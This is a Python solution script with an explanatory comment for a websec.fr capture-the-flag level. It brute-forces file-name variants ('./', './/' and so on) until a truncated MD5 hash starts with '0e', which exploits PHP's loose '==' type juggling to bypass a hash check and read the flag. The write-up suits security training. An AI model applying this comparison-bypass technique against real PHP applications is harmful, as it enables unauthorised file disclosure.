from requests import *
import time

level = 10
if(level < 10):
    level = "0" + str(level)
url = f"https://websec.fr/level{level}/index.php"

i = 1
start = time.time()
while(True):
    filename = "." + "/" * i + "flag.php"
#    filename = "./" * i + "flag.php"
    data = {
        "f": filename,
        "hash": "0"
    }

    r = post(url, data=data).text
    if(r.find("WEBSEC") != -1):
        break
    else:
        if(i % 50 == 0):
            passed = time.time() - start
            print(f"{i} times, {passed:.2f}s")
        i += 1
print(f"sucess! {i}\n")

s = r.find("WEBSEC")
e = r.find("}", s) + 1
passed = time.time() - start
print(f"flag: {r[s:e]}\ntook {int(passed)}s")

"""
I first opened burp and saw that my "input" is structures like this:
f=flag.php&hash=67676767

And the flow is like this:
They create a hash from the flag+desiredFileName+flag and then saving its
first 8 bytes.
If the cutted hash is equal to our hash we win.
So the first thing poped to my eye is the use of `==` and not `===`, so maybe
we can somehow write some string thatll result in something interesting?
I read that if the md5 start with e0 php treats it as 0 x 10^.. so this is
a good lead, but didnt work with the file `flag.php` and other files are
irrelevant. What we CAN do is play with the file name, cause:
"flag.php" = "./flag.php" = "././flag.php" = ".//flag.php"
and they all have different hashes, if we'll add a slash each iteration
until we got a hash that start with e0 we'll get the flag.
"""
